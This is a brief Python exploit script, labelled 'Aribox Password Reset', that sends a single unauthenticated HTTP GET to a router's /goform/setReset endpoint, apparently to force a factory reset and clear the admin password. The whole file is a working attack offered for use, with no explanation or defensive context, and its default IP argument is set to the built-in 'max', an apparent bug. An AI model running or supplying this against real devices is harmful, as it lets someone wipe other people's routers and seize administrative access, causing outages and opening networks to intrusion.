import argparse
import requests
import re

def ResetSettingsToFactory(ip):
	url='http://{}/goform/setReset'.format(ip)
	r = requests.get(url)
	
if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Aribox Password Reset')
	parser.add_argument('-ip', action ='store', dest='ip', help="IP of router",default=max)
	results = parser.parse_args()
	ResetSettingsToFactory(results.ip)
